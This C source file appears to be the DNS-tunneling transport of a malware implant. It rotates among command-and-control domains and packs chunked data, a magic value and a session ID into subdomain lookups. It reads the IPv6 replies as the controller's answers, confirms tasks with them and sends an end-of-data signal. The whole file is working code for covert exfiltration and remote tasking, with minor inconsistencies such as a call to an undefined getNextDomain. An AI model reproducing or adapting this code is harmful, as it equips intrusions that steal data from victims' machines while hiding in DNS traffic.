#include "Support/String.h"
#include "Transport/DNS.h"
#include "Macro/Macro.h"
#include "Hams.h"
#include "Debug.h"
#include "Support/Memory.h"
#include "Support/General.h"
#include "Transport/Transport.h"
#include "Core/Tasks/Modules/Accessory.h"

int chunkSize = 32;
MessageQueue = 1;
int UseDomain=0;

int GetC2Domain(){
    int Domain=0;
    if (Hams->C2DomainsCount<=1){
        return 0;
    }else if(UseDomain>=Hams->C2DomainsCount){
        UseDomain=0;
        return 0;
    }
    Domain=UseDomain;
    UseDomain++;
    return Domain;
}

unsigned char *Connect(char *Name,char* Domain)
{
    char FullDomain[256] = {0};
    snprintf(FullDomain, sizeof(FullDomain), "%s.%s", Name,Domain );
    DPRINT("FullDomain [%s]\n", FullDomain);

    unsigned char *Ipv6 = ResolveDomain(FullDomain);
    Memset(FullDomain,0,sizeof(FullDomain));
    if (!Ipv6)
    {

        return 0;
    }
    DPRINT("Return IPV6\n ");
    // Only for debug
    for (size_t i = 0; i < 16; i++)
    {
        DPRINT("%02x ", Ipv6[i]);
    }
    DPRINT("\n");
    // removeColon(Ipv6);
    return Ipv6;
}

unsigned char *Send(char *Data)
{
    char FullUrl[255] = {0};
    char RandomStr[5] = {0};
    int RandomStrLen = 4;
    GenerateRandomString(RandomStr, RandomStrLen);
    if (MessageQueue > 9)
    {
        MessageQueue = 1;
    }
    snprintf(FullUrl, sizeof(FullUrl), "%s%d%s", Data, MessageQueue, RandomStr);
    DPRINT("FullUrl [%s]\n", FullUrl);

    while(1){
        unsigned char *Recived = Connect(FullUrl,getNextDomain());
        if (Recived)
        {
            MessageQueue++;
            return Recived;
        }
        MessageQueue++;
        if (MessageQueue > 9)
        {
        MessageQueue = 1;
        }
        Memset(FullUrl,0,sizeof(FullUrl));
        snprintf(FullUrl, sizeof(FullUrl), "%s%d%s", Data, MessageQueue, RandomStr);
        Sleep(2000);
    }

    return 0;
}

unsigned char *NotifyC2(unsigned long long MassageSize, char *MassageType)
{
    char NotifyMassage[255] = {0};
    snprintf(NotifyMassage, sizeof(NotifyMassage), "%s%s%s%d",  Hams->MagicValue, MassageType,  Hams->SessionID, MassageSize);
    DPRINT("NotifyMassage [%s]\n", NotifyMassage);
    unsigned char *Recived = Send(NotifyMassage);
    if (Recived == 0)
    {
        RED_DPRINT("Notify C2 Connection Error\n");
        return 0;
    }
    Memset(NotifyMassage,0,sizeof(NotifyMassage));
    return Recived;
}

int EndNotifyC2()
{
    char EndMassage[255] = {0};
    snprintf(EndMassage, sizeof(EndMassage), "%s%s%s", Hams->MagicValue, MacroDataEnd, Hams->SessionID);
    unsigned char *Recived = Send(EndMassage);
    if (Recived == 0)
    {
        RED_DPRINT("End Notify C2 Connection Error \n");
        return 0;
    }
    HFree(Recived,INET6_ADDRSTRLEN);
    Memset(EndMassage,0,sizeof(EndMassage));
    return 1;
}

int PackageSend(const char *Buffer, int Size, const char *RemaingCode)
{
    int chunkCount = 0;
    int TotalSend = 0;
    int Remaining = Size;
    int toCpy = chunkSize;
    unsigned char *Data =NULL;
    char tosend[100] = {0};
    DPRINT(" Package Send chunk Count [%d]\n", Size / chunkSize);

    if (Remaining <= chunkSize)
    {
        YELLOW_DPRINT(" Sending Only one Request\n");

        snprintf(tosend, sizeof(tosend), "%s%s%s%s", Hams->MagicValue, RemaingCode, Hams->SessionID, Buffer);

        int error;
        Data = Send(tosend);
        if (Data == 0)
        {
            RED_DPRINT("[-] Packag Send Connection Error\n");
            return 0;
        }
        HFree(Data,INET6_ADDRSTRLEN);
    }
    else
    {
        while (Remaining > 0)
        {

            DPRINT(" Remaining [%d]\n", Remaining);
            TotalSend += toCpy;
            Remaining -= toCpy;
            snprintf(tosend, sizeof(tosend), "%s%s%s", Hams->MagicValue, RemaingCode,  Hams->SessionID);
            strncat(tosend, Buffer + TotalSend - toCpy, toCpy);

            Data = Send(tosend);
            if (Data == 0)
            {
                RED_DPRINT("Packag Send Connection Error\n");
                return 0;
            }else if (!VerifyTask(Data)){

                RED_DPRINT("No Task With this ID\n");
                HFree(Data,INET6_ADDRSTRLEN);
                return 0;

            }
            HFree(Data,INET6_ADDRSTRLEN);
            if (Size - TotalSend <= toCpy)
            {
                YELLOW_DPRINT("Sending Last Chank\n");
                toCpy = Size - TotalSend;
            }
            Memset(tosend, 0, sizeof(tosend));

        }
    }
    GREEN_DPRINT(" Package Has been Sent Successfully\n");
    return 1;
}
